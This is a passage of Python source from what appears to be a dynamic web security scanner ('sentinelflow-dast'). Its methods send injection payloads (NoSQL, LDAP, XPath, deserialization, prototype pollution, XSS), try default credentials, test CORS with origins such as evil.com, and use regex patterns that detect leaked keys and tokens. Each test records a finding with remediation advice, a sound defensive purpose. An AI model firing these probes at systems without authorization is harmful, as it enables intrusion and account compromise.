                                "scan_id": scan_id, "service_id": service_id,
                                "url": gql_url, "phase": "dast",
                                "severity": "high", "category": "graphql_introspection",
                                "title": "GraphQL Introspection Enabled",
                                "description": "Full API schema exposed via GraphQL introspection. Attackers can enumerate all types, queries, mutations.",
                                "evidence": f"URL: {gql_url}\n{body[:400]}",
                                "remediation": "Disable introspection in production. Add authentication. Implement query depth limiting.",
                                "cvss_score": 5.3, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(finding)
                            log_finding(logger, "high", finding["title"], {"url": gql_url})
                            findings.append(finding)
            except Exception:
                pass
        return findings

    async def _test_clickjacking(self, base_url, service_id, scan_id):
        """Test for clickjacking vulnerability."""
        findings = []
        try:
            async with create_session(self.config) as session:
                async with session.get(
                    base_url, timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False, allow_redirects=True,
                ) as resp:
                    xfo = resp.headers.get("X-Frame-Options", "")
                    csp = resp.headers.get("Content-Security-Policy", "")
                    if not xfo and "frame-ancestors" not in csp.lower():
                        finding = {
                            "scan_id": scan_id, "service_id": service_id,
                            "url": base_url, "phase": "dast",
                            "severity": "medium", "category": "clickjacking",
                            "title": "Clickjacking: No Frame Protection",
                            "description": "No X-Frame-Options or CSP frame-ancestors header. Page can be embedded in attacker iframes.",
                            "evidence": f"X-Frame-Options: {xfo or 'NOT SET'}\nCSP frame-ancestors: NOT SET",
                            "remediation": "Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'",
                            "cvss_score": 4.3, "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(finding)
                        findings.append(finding)
        except Exception:
            pass
        return findings

    async def _test_subdomain_takeover(self, subdomain, service_id, scan_id):
        """Detect dangling DNS pointing to unclaimed cloud services."""
        findings = []
        takeover_sigs = {
            "GitHub Pages": ["There isn't a GitHub Pages site here"],
            "Heroku": ["No such app"],
            "AWS S3": ["NoSuchBucket"],
            "Azure": ["404 Web Site not found"],
            "Shopify": ["Sorry, this shop is currently unavailable"],
            "Fastly": ["Fastly error: unknown domain"],
        }
        for url in [f"http://{subdomain}", f"https://{subdomain}"]:
            try:
                async with create_session(self.config) as session:
                    async with session.get(
                        url, timeout=aiohttp.ClientTimeout(total=8),
                        ssl=False, allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        for provider, sigs in takeover_sigs.items():
                            if any(sig.lower() in body.lower() for sig in sigs):
                                finding = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": url, "phase": "dast",
                                    "severity": "high", "category": "subdomain_takeover",
                                    "title": f"Subdomain Takeover Risk: {subdomain} ({provider})",
                                    "description": f"Subdomain {subdomain} points to unclaimed {provider} service. Attacker can serve malicious content from your domain.",
                                    "evidence": f"Provider: {provider}\n{body[:200]}",
                                    "remediation": f"Remove DNS record for {subdomain} or claim the {provider} service.",
                                    "cvss_score": 8.1, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "high", finding["title"], {"subdomain": subdomain})
                                findings.append(finding)
                                return findings
            except Exception:
                pass
        return findings

    async def _test_default_creds(self, base_url, service_id, scan_id):
        """Test for default credentials on login forms."""
        findings = []
        login_paths = ["/login","/admin/login","/wp-login.php","/admin",
                       "/signin","/auth/login","/user/login","/account/login"]
        from urllib.parse import urljoin
        for path in login_paths[:6]:
            login_url = urljoin(base_url, path)
            await self.rate_limiter.acquire()
            try:
                async with create_session(self.config) as session:
                    async with session.get(
                        login_url, timeout=aiohttp.ClientTimeout(total=8),
                        ssl=False, allow_redirects=True,
                    ) as resp:
                        if resp.status not in (200, 302):
                            continue
                        body = await resp.text(errors="ignore")
                        if not any(kw in body.lower() for kw in ["password","login","signin","username","email"]):
                            continue
                    for username, password in DEFAULT_CREDS[:6]:
                        await self.rate_limiter.acquire()
                        async with session.post(
                            login_url,
                            data={"username": username, "password": password,
                                  "user": username, "pass": password, "email": username},
                            timeout=aiohttp.ClientTimeout(total=8),
                            ssl=False, allow_redirects=True,
                        ) as resp:
                            body = await resp.text(errors="ignore")
                            if resp.status == 200 and any(kw in body.lower() for kw in [
                                "dashboard","welcome","logout","profile","my account","signed in","logged in"
                            ]):
                                finding = {
                                    "scan_id": scan_id, "service_id": service_id,
                                    "url": login_url, "phase": "dast",
                                    "severity": "critical", "category": "default_credentials",
                                    "title": f"Default Credentials Work: {username}/{password}",
                                    "description": f"Login at `{login_url}` accepts {username}/{password}. Immediate unauthorized access possible.",
                                    "evidence": f"Credentials: {username}/{password}\nHTTP {resp.status}\n{body[:200]}",
                                    "remediation": "Force password change on first login. Implement account lockout. Remove all default credentials.",
                                    "cvss_score": 9.8, "tool": "sentinelflow-dast",
                                }
                                await self.db.insert_finding(finding)
                                log_finding(logger, "critical", finding["title"], {"url": login_url})
                                findings.append(finding)
                                return findings
            except Exception:
                pass
        return findings

    async def _test_mass_assignment(self, endpoint, service_id, scan_id):
        """Test for mass assignment / parameter pollution."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        method = endpoint.get("method", "GET")
        if not params:
            return []
        for extra_param in MASS_ASSIGN_PARAMS[:8]:
            await self.rate_limiter.acquire()
            test_params = dict(params)
            test_params[extra_param] = ["1"]
            try:
                async with create_session(self.config) as session:
                    if method == "POST":
                        flat = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                        resp_ctx = session.post(url, data=flat, timeout=aiohttp.ClientTimeout(total=10), ssl=False)
                    else:
                        test_url = self._rebuild_url(url, test_params)
                        resp_ctx = session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True)
                    async with resp_ctx as resp:
                        body = await resp.text(errors="ignore")
                        if resp.status == 200 and extra_param in body:
                            finding = {
                                "scan_id": scan_id, "service_id": service_id,
                                "url": url, "phase": "dast",
                                "severity": "high", "category": "mass_assignment",
                                "title": f"Possible Mass Assignment: {extra_param} reflected",
                                "description": f"Injecting `{extra_param}=1` appeared in the response. May allow setting privileged fields like admin, role, price.",
                                "evidence": f"Param: {extra_param}=1\nFound in: {body[max(0,body.find(extra_param)-50):body.find(extra_param)+100]}",
                                "remediation": "Use allowlist of permitted fields. Never auto-bind all request params to data models.",
                                "cvss_score": 7.5, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(finding)
                            log_finding(logger, "high", finding["title"], {"url": url})
                            findings.append(finding)
                            return findings
            except Exception:
                pass
        return findings


    async def _test_nosql_injection(self, endpoint, service_id, scan_id):
        """Test for NoSQL injection."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        NOSQL_PAYLOADS = ['{"$gt": ""}', '{"$ne": null}', '[$ne]=1', '[$gt]=', "' || 'x'='x", '{"$regex": ".*"}']
        NOSQL_SIGS = ["MongoError", "MongoDB", "mongoose", "CastError", "ObjectId", "BSONTypeError"]
        for param_name in list(params.keys())[:8]:
            for payload in NOSQL_PAYLOADS[:4]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            for sig in NOSQL_SIGS:
                                if sig.lower() in body.lower():
                                    f = {"scan_id": scan_id, "service_id": service_id, "url": test_url, "phase": "dast", "severity": "critical", "category": "nosql_injection", "title": f"NoSQL Injection: {param_name}", "description": f"Parameter `{param_name}` vulnerable to NoSQL injection. Signature `{sig}` detected.", "evidence": f"Payload: {payload}\nSig: {sig}\n{body[:300]}", "remediation": "Validate inputs. Block MongoDB operators. Use parameterized queries.", "cvss_score": 9.8, "tool": "sentinelflow-dast"}
                                    await self.db.insert_finding(f)
                                    log_finding(logger, "critical", f["title"], {"url": url})
                                    findings.append(f)
                                    return findings
                            if resp.status == 200 and any(kw in body.lower() for kw in ["welcome","dashboard","logout","admin"]):
                                f = {"scan_id": scan_id, "service_id": service_id, "url": test_url, "phase": "dast", "severity": "critical", "category": "nosql_injection", "title": f"NoSQL Auth Bypass: {param_name}", "description": f"NoSQL operator in `{param_name}` may have bypassed authentication.", "evidence": f"Payload: {payload}\nHTTP 200 with auth indicators\n{body[:300]}", "remediation": "Sanitize inputs. Block MongoDB operators.", "cvss_score": 9.8, "tool": "sentinelflow-dast"}
                                await self.db.insert_finding(f)
                                log_finding(logger, "critical", f["title"], {"url": url})
                                findings.append(f)
                                return findings
                except Exception:
                    pass
        return findings

    async def _test_ldap_injection(self, endpoint, service_id, scan_id):
        """Test for LDAP injection."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        LDAP_PAYLOADS = ["*", "*)(&", "*))%00", ")(uid=*))(|(uid=*", "*()|%26'"]
        LDAP_SIGS = ["LDAPException", "LDAPError", "ldap_", "javax.naming", "Invalid DN", "LDAP search failed"]
        for param_name in list(params.keys())[:8]:
            for payload in LDAP_PAYLOADS[:4]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            for sig in LDAP_SIGS:
                                if sig.lower() in body.lower():
                                    f = {"scan_id": scan_id, "service_id": service_id, "url": test_url, "phase": "dast", "severity": "critical", "category": "ldap_injection", "title": f"LDAP Injection: {param_name}", "description": f"Parameter `{param_name}` injectable into LDAP queries. Auth bypass possible.", "evidence": f"Payload: {payload}\nSig: {sig}\n{body[:300]}", "remediation": "Escape LDAP special chars. Use parameterized LDAP queries.", "cvss_score": 9.1, "tool": "sentinelflow-dast"}
                                    await self.db.insert_finding(f)
                                    log_finding(logger, "critical", f["title"], {"url": url})
                                    findings.append(f)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_xpath_injection(self, endpoint, service_id, scan_id):
        """Test for XPath injection."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        XPATH_PAYLOADS = ["' or '1'='1", "' or 1=1 or ''='", "x' or 1=1 or 'x'='y", "/) or 1=1 or (/"]
        XPATH_SIGS = ["XPathException", "XPath", "javax.xml.xpath", "System.Xml.XPath", "Invalid expression"]
        for param_name in list(params.keys())[:8]:
            for payload in XPATH_PAYLOADS[:3]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [payload]
                test_url = self._rebuild_url(url, test_params)
                try:
                    async with create_session(self.config) as session:
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                            body = await resp.text(errors="ignore")
                            for sig in XPATH_SIGS:
                                if sig.lower() in body.lower():
                                    f = {"scan_id": scan_id, "service_id": service_id, "url": test_url, "phase": "dast", "severity": "high", "category": "xpath_injection", "title": f"XPath Injection: {param_name}", "description": f"Parameter `{param_name}` injectable into XPath queries.", "evidence": f"Payload: {payload}\nSig: {sig}\n{body[:300]}", "remediation": "Use parameterized XPath. Escape special characters.", "cvss_score": 7.5, "tool": "sentinelflow-dast"}
                                    await self.db.insert_finding(f)
                                    log_finding(logger, "high", f["title"], {"url": url})
                                    findings.append(f)
                                    return findings
                except Exception:
                    pass
        return findings

    async def _test_business_logic(self, endpoint, service_id, scan_id):
        """Test for business logic flaws."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        method = endpoint.get("method", "GET")
        PRICE_PARAMS = ["price","amount","cost","total","qty","quantity","count","num","discount","fee"]
        price_params = {k: v for k, v in params.items() if k.lower() in PRICE_PARAMS}
        if not price_params:
            return []
        for param_name in list(price_params.keys())[:5]:
            for neg_val in ["-1", "-100", "0", "0.001"]:
                await self.rate_limiter.acquire()
                test_params = dict(params)
                test_params[param_name] = [neg_val]
                try:
                    async with create_session(self.config) as session:
                        if method == "POST":
                            flat = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                            async with session.post(url, data=flat, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                                body = await resp.text(errors="ignore")
                                status = resp.status
                        else:
                            test_url = self._rebuild_url(url, test_params)
                            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                                body = await resp.text(errors="ignore")
                                status = resp.status
                        if status == 200 and any(kw in body.lower() for kw in ["success","added","cart","order","checkout","total"]):
                            f = {"scan_id": scan_id, "service_id": service_id, "url": url, "phase": "dast", "severity": "high", "category": "business_logic", "title": f"Business Logic Flaw: {param_name}={neg_val} accepted", "description": f"Parameter `{param_name}` accepted `{neg_val}`. May allow price manipulation.", "evidence": f"Param: {param_name}={neg_val}\nHTTP {status}\n{body[:300]}", "remediation": "Validate numeric inputs server-side. Reject negative/zero values.", "cvss_score": 7.5, "tool": "sentinelflow-dast"}
                            await self.db.insert_finding(f)
                            log_finding(logger, "high", f["title"], {"url": url})
                            findings.append(f)
                            return findings
                except Exception:
                    pass
        return findings

    async def _test_http_methods(self, base_url, service_id, scan_id):
        """Test for dangerous HTTP methods."""
        findings = []
        try:
            async with create_session(self.config) as session:
                async with session.options(base_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                    allow = resp.headers.get("Allow", "") + " " + resp.headers.get("Access-Control-Allow-Methods", "")
                    for method in ["PUT", "DELETE", "TRACE", "CONNECT"]:
                        if method in allow.upper():
                            sev = "critical" if method == "TRACE" else "high"
                            f = {"scan_id": scan_id, "service_id": service_id, "url": base_url, "phase": "dast", "severity": sev, "category": "dangerous_http_method", "title": f"Dangerous HTTP Method Enabled: {method}", "description": f"HTTP {method} is allowed. {'TRACE enables XST attacks.' if method == 'TRACE' else f'{method} may allow data modification.'}", "evidence": f"OPTIONS Allow: {allow}", "remediation": f"Disable HTTP {method} in web server config.", "cvss_score": 7.5, "tool": "sentinelflow-dast"}
                            await self.db.insert_finding(f)
                            log_finding(logger, sev, f["title"], {"url": base_url})
                            findings.append(f)
                async with session.request("TRACE", base_url, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                    if resp.status == 200:
                        body = await resp.text(errors="ignore")
                        if "TRACE" in body or "Via" in body:
                            f = {"scan_id": scan_id, "service_id": service_id, "url": base_url, "phase": "dast", "severity": "medium", "category": "http_trace_enabled", "title": "HTTP TRACE Enabled (XST Risk)", "description": "TRACE method active. Cross-Site Tracing can steal HttpOnly cookies.", "evidence": f"HTTP {resp.status}\n{body[:200]}", "remediation": "Disable TRACE: TraceEnable Off (Apache) or deny TRACE (nginx).", "cvss_score": 4.3, "tool": "sentinelflow-dast"}
                            await self.db.insert_finding(f)
                            findings.append(f)
        except Exception:
            pass
        return findings

    async def _test_info_disclosure(self, base_url, service_id, scan_id):
        """Check for information disclosure via API/info endpoints."""
        findings = []
        from urllib.parse import urljoin
        import asyncio as _asyncio
        INFO_PATHS = [
            "/api/v1/","/api/v2/","/api/","/health","/healthz","/status","/ping",
            "/metrics","/env","/config","/version","/actuator/env","/actuator/health",
            "/actuator/info","/actuator/mappings","/actuator/beans","/actuator/heapdump",
            "/.well-known/security.txt","/security.txt","/trace","/TRACE",
            "/WEB-INF/web.xml","/META-INF/MANIFEST.MF","/.htaccess","/.htpasswd",
            "/elmah.axd","/trace.axd","/web.config.bak","/app.config",
            "/api/swagger","/api/swagger.json","/v1/swagger.json",
        ]
        sem = _asyncio.Semaphore(15)
        async def check(path):
            async with sem:
                await self.rate_limiter.acquire()
                url = urljoin(base_url.rstrip("/")+"/", path.lstrip("/"))
                try:
                    async with create_session(self.config) as session:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), ssl=False, allow_redirects=False) as resp:
                            if resp.status in (200, 206):
                                body = await resp.text(errors="ignore")
                                if len(body) < 30:
                                    return None
                                sev = "high" if any(kw in path for kw in ["env","config","actuator","web.xml","MANIFEST","htaccess","htpasswd","elmah","trace.axd"]) else "medium"
                                return {"scan_id": scan_id, "service_id": service_id, "url": url, "phase": "dast", "severity": sev, "category": "information_disclosure", "title": f"Info Disclosure: {path}", "description": f"Endpoint `{path}` publicly accessible, may expose sensitive info.", "evidence": f"HTTP {resp.status}\n{body[:400]}", "remediation": "Restrict diagnostic endpoints. Remove info pages in production.", "cvss_score": 5.3, "tool": "sentinelflow-dast"}
                except Exception:
                    pass
                return None
        tasks = [check(p) for p in INFO_PATHS]
        results = await _asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and isinstance(r, dict):
                await self.db.insert_finding(r)
                log_finding(logger, r["severity"], r["title"], {"url": r["url"]})
                findings.append(r)
        return findings

    async def _test_jwt_issues(self, base_url, service_id, scan_id):
        """Detect JWT tokens and test for weak configurations."""
        findings = []
        try:
            async with create_session(self.config) as session:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                    body = await resp.text(errors="ignore")
                    headers_str = str(dict(resp.headers))
                    jwt_match = re.search(r'eyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+', body + headers_str)
                    if jwt_match:
                        token = jwt_match.group(0)
                        import base64, json as _json
                        try:
                            header = _json.loads(base64.b64decode(token.split('.')[0] + '==').decode('utf-8', errors='ignore'))
                            alg = header.get('alg', '')
                            if alg.lower() == 'none':
                                sev, desc = "critical", "JWT uses alg=none - signature verification DISABLED!"
                            elif alg.upper() in ['HS256','HS384','HS512']:
                                sev, desc = "medium", f"JWT uses symmetric {alg}. Vulnerable to brute force if weak secret."
                            else:
                                sev, desc = "info", f"JWT found using {alg}."
                            f = {"scan_id": scan_id, "service_id": service_id, "url": base_url, "phase": "dast", "severity": sev, "category": "jwt_vulnerability", "title": f"JWT Token: alg={alg}", "description": desc, "evidence": f"Token: {token[:80]}...\nHeader: {header}", "remediation": "Use RS256/ES256. Validate alg. Reject alg=none. Use strong HMAC secrets.", "cvss_score": 9.1 if alg.lower()=='none' else 5.3, "tool": "sentinelflow-dast"}
                            await self.db.insert_finding(f)
                            log_finding(logger, sev, f["title"], {"url": base_url})
                            findings.append(f)
                        except Exception:
                            pass
        except Exception:
            pass
        return findings

    async def _test_cors_advanced(self, base_url, service_id, scan_id):
        """Advanced CORS misconfiguration testing."""
        findings = []
        BYPASS_ORIGINS = ["null","https://evil.com","https://attacker.com","http://localhost","https://target.com.evil.com"]
        for origin in BYPASS_ORIGINS:
            await self.rate_limiter.acquire()
            try:
                async with create_session(self.config) as session:
                    async with session.get(base_url, headers={"Origin": origin}, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                        acao = resp.headers.get("Access-Control-Allow-Origin", "")
                        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                        if acao == origin or acao == "null":
                            sev = "critical" if "true" in acac.lower() else "high"
                            f = {"scan_id": scan_id, "service_id": service_id, "url": base_url, "phase": "dast", "severity": sev, "category": "cors_advanced", "title": f"CORS: Arbitrary Origin Trusted ({origin})", "description": f"Server trusts `{origin}`. {'Full account takeover possible.' if sev=='critical' else 'Cross-origin data theft possible.'}", "evidence": f"Origin: {origin}\nACAO: {acao}\nACAC: {acac}", "remediation": "Strict origin allowlist. Never reflect arbitrary origins.", "cvss_score": 9.8 if sev=="critical" else 7.5, "tool": "sentinelflow-dast"}
                            await self.db.insert_finding(f)
                            log_finding(logger, sev, f["title"], {"url": base_url})
                            findings.append(f)
                            return findings
            except Exception:
                pass
        return findings

    async def _test_prototype_pollution(self, endpoint, service_id, scan_id):
        """Test for prototype pollution in JSON APIs."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        payloads = ['{"__proto__": {"admin": true}}', '{"constructor": {"prototype": {"admin": true}}}']
        for payload_str in payloads:
            await self.rate_limiter.acquire()
            try:
                import json as _json
                payload = _json.loads(payload_str)
                async with create_session(self.config) as session:
                    async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                        body = await resp.text(errors="ignore")
                        if resp.status == 200 and any(kw in body.lower() for kw in ["admin","true","privilege","role"]):
                            f = {"scan_id": scan_id, "service_id": service_id, "url": url, "phase": "dast", "severity": "high", "category": "prototype_pollution", "title": "Possible Prototype Pollution", "description": f"JSON with `__proto__` keys returned 200 with privilege indicators.", "evidence": f"Payload: {payload_str}\n{body[:300]}", "remediation": "Freeze Object.prototype. Sanitize JSON keys.", "cvss_score": 7.5, "tool": "sentinelflow-dast"}
                            await self.db.insert_finding(f)
                            log_finding(logger, "high", f["title"], {"url": url})
                            findings.append(f)
                            return findings
            except Exception:
                pass
        return findings

    async def _test_deserialization(self, endpoint, service_id, scan_id):
        """Test for insecure deserialization."""
        findings = []
        url = endpoint.get("url", "")
        params = endpoint.get("params", {})
        if not params:
            return []
        DESERIAL_PAYLOADS = ['O:8:"stdClass":0:{}', "rO0ABXNyAA==", "YToxOntzOjU6ImFkbWluIjtiOjE7fQ=="]
        DESERIAL_SIGS = ["unserialize","ObjectInputStream","pickle","java.io.ObjectInputStream","readObject","__wakeup"]
        for payload in DESERIAL_PAYLOADS[:2]:
            await self.rate_limiter.acquire()
            try:
                async with create_session(self.config) as session:
                    async with session.post(url, data=payload, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                        body = await resp.text(errors="ignore")
                        for sig in DESERIAL_SIGS:
                            if sig.lower() in body.lower():
                                f = {"scan_id": scan_id, "service_id": service_id, "url": url, "phase": "dast", "severity": "critical", "category": "insecure_deserialization", "title": "Insecure Deserialization Detected", "description": f"Server deserializes untrusted data. Signature `{sig}` found. RCE possible.", "evidence": f"Payload: {payload[:50]}\nSig: {sig}\n{body[:300]}", "remediation": "Never deserialize untrusted data. Use JSON. Implement integrity checks.", "cvss_score": 9.8, "tool": "sentinelflow-dast"}
                                await self.db.insert_finding(f)
                                log_finding(logger, "critical", f["title"], {"url": url})
                                findings.append(f)
                                return findings
            except Exception:
                pass
        return findings


    async def _test_cookie_security(self, base_url, service_id, scan_id):
        """Check for insecure cookie flags."""
        findings = []
        try:
            async with create_session(self.config) as session:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                    for header, value in resp.headers.items():
                        if header.lower() != "set-cookie":
                            continue
                        cookie_lower = value.lower()
                        issues = []
                        if "httponly" not in cookie_lower:
                            issues.append("Missing HttpOnly flag")
                        if "secure" not in cookie_lower and base_url.startswith("https"):
                            issues.append("Missing Secure flag")
                        if "samesite" not in cookie_lower:
                            issues.append("Missing SameSite flag")
                        if issues:
                            f = {
                                "scan_id": scan_id, "service_id": service_id,
                                "url": base_url, "phase": "dast",
                                "severity": "medium", "category": "insecure_cookie",
                                "title": f"Insecure Cookie: {', '.join(issues)}",
                                "description": f"Cookie set without security flags: {', '.join(issues)}. Cookie value: {value[:100]}",
                                "evidence": f"Set-Cookie: {value[:200]}",
                                "remediation": "Add HttpOnly, Secure, and SameSite=Strict flags to all cookies.",
                                "cvss_score": 5.3, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(f)
                            findings.append(f)
        except Exception:
            pass
        return findings

    async def _test_csrf(self, base_url, service_id, scan_id):
        """Test for CSRF vulnerabilities on forms."""
        findings = []
        try:
            async with create_session(self.config) as session:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                    body = await resp.text(errors="ignore")
                    forms = re.findall(r"""<form[^>]*method=["']post["'][^>]*>.*?</form>""", body, re.IGNORECASE | re.DOTALL)
                    for form in forms:
                        has_csrf = any(kw in form.lower() for kw in [
                            "csrf", "token", "_token", "authenticity_token",
                            "nonce", "xsrf", "__requestverificationtoken"
                        ])
                        if not has_csrf:
                            f = {
                                "scan_id": scan_id, "service_id": service_id,
                                "url": base_url, "phase": "dast",
                                "severity": "high", "category": "csrf",
                                "title": "CSRF: POST Form Missing Anti-CSRF Token",
                                "description": "A POST form was found without a CSRF token. Attackers can trick authenticated users into submitting malicious requests.",
                                "evidence": f"Form snippet: {form[:300]}",
                                "remediation": "Add CSRF tokens to all state-changing forms. Use SameSite=Strict cookies.",
                                "cvss_score": 6.5, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(f)
                            log_finding(logger, "high", f["title"], {"url": base_url})
                            findings.append(f)
                            break
        except Exception:
            pass
        return findings

    async def _test_waf_detection(self, base_url, service_id, scan_id):
        """Detect WAF presence and fingerprint it."""
        findings = []
        WAF_SIGNATURES = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF": ["awswaf", "x-amzn-requestid"],
            "Akamai": ["akamai", "x-akamai-transformed"],
            "Sucuri": ["x-sucuri-id", "sucuri"],
            "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
            "F5 BIG-IP": ["bigipserver", "f5", "ts="],
            "Imperva": ["x-iinfo", "incapsula", "visid_incap"],
            "Barracuda": ["barra_counter_session", "barracuda"],
        }
        try:
            async with create_session(self.config) as session:
                # Send a known attack payload to trigger WAF
                test_url = base_url + "?test=<script>alert(1)</script>"
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                    headers_str = str(dict(resp.headers)).lower()
                    body = await resp.text(errors="ignore")
                    combined = headers_str + body.lower()
                    for waf_name, sigs in WAF_SIGNATURES.items():
                        if any(sig.lower() in combined for sig in sigs):
                            f = {
                                "scan_id": scan_id, "service_id": service_id,
                                "url": base_url, "phase": "dast",
                                "severity": "info", "category": "waf_detected",
                                "title": f"WAF Detected: {waf_name}",
                                "description": f"{waf_name} WAF/CDN detected. Security testing may be partially blocked.",
                                "evidence": f"Signatures matched: {sigs}",
                                "remediation": "WAF is a positive security control. Ensure it is properly configured.",
                                "cvss_score": 0.0, "tool": "sentinelflow-dast",
                            }
                            await self.db.insert_finding(f)
                            findings.append(f)
                            return findings
                    if resp.status == 403 and len(body) < 500:
                        f = {
                            "scan_id": scan_id, "service_id": service_id,
                            "url": base_url, "phase": "dast",
                            "severity": "info", "category": "waf_detected",
                            "title": "WAF/Security Filter Detected (Unknown)",
                            "description": "Attack payload blocked with 403. WAF or security filter present.",
                            "evidence": f"HTTP 403 on XSS payload\n{body[:200]}",
                            "remediation": "WAF detected. Ensure rules are up to date.",
                            "cvss_score": 0.0, "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(f)
                        findings.append(f)
        except Exception:
            pass
        return findings

    async def _test_rate_limiting(self, base_url, service_id, scan_id):
        """Test if rate limiting is implemented on login/sensitive endpoints."""
        findings = []
        from urllib.parse import urljoin
        import asyncio as _asyncio
        test_paths = ["/login", "/signin", "/api/login", "/api/auth", "/wp-login.php", "/admin/login"]
        for path in test_paths[:4]:
            url = urljoin(base_url, path)
            try:
                responses = []
                async with create_session(self.config) as session:
                    for i in range(10):
                        async with session.post(url,
                            data={"username": f"test{i}", "password": "wrongpassword"},
                            timeout=aiohttp.ClientTimeout(total=5), ssl=False, allow_redirects=False) as resp:
                            responses.append(resp.status)
                # If all 10 requests got through without 429/503
                if len([r for r in responses if r in (429, 503, 403)]) == 0 and len(responses) == 10:
                    if any(r in (200, 302, 401) for r in responses):
                        f = {
                            "scan_id": scan_id, "service_id": service_id,
                            "url": url, "phase": "dast",
                            "severity": "high", "category": "no_rate_limiting",
                            "title": f"No Rate Limiting on {path}",
                            "description": f"10 rapid requests to `{path}` were all accepted without throttling. Brute force attacks possible.",
                            "evidence": f"10 requests, statuses: {responses}",
                            "remediation": "Implement rate limiting (max 5 attempts/minute). Add CAPTCHA. Lock accounts after failed attempts.",
                            "cvss_score": 7.5, "tool": "sentinelflow-dast",
                        }
                        await self.db.insert_finding(f)
                        log_finding(logger, "high", f["title"], {"url": url})
                        findings.append(f)
                        return findings
            except Exception:
                pass
        return findings

    async def _test_sensitive_data_exposure(self, base_url, service_id, scan_id):
        """Scan responses for sensitive data patterns."""
        findings = []
        PATTERNS = {
            "Credit Card": r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b",
            "AWS Access Key": r"AKIA[0-9A-Z]{16}",
            "Private Key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
            "Stripe Secret": r"sk_(?:live|test)_[0-9a-zA-Z]{24,}",
            "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,}",
            "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
            "Slack Token": r"xox[baprs]\-[0-9]{10,12}\-[0-9]{10,12}\-[a-zA-Z0-9]{24,32}",
            "Password Field": r"(?:\"password\"|\"passwd\"|\"pwd\")\\s*:\\s*\"[^\"]{4,}\"",
            "Internal IP": r"(?:10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+)",
        }
        try:
            async with create_session(self.config) as session:
                async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=6), ssl=False, allow_redirects=True) as resp:
                    body = await resp.text(errors="ignore")
                    for pattern_name, pattern in PATTERNS.items():
                        match = re.search(pattern, body)
                        if match:
                            matched = match.group(0)
                            # Mask middle of sensitive value
                            masked = matched[:4] + "****" + matched[-4:] if len(matched) > 8 else "****"
                            f = {
                                "scan_id": scan_id, "service_id": service_id,
                                "url": base_url, "phase": "dast",
                                "severity": "critical", "category": "sensitive_data_exposure",
                                "title": f"Sensitive Data Exposed: {pattern_name}",
                                "description": f"{pattern_name} pattern found in HTTP response. Sensitive data is being leaked to clients.",
                                "evidence": f"Pattern: {pattern_name}\nMatch: {masked}\nURL: {base_url}",
                                "remediation": "Remove sensitive data from responses. Encrypt stored credentials. Use environment variables.",
